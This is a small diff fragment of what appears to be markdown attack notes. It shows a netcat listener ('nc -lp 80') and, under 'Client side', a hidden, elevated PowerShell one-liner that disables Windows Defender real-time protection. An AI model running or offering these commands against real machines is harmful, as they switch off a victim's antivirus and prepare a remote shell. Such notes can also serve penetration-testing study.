@@ -8,7 +8,7 @@ nc -lp 80
 ### Client side
 
 - Disable windows defender
-- 
+
 ```ps1
 powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
 ```
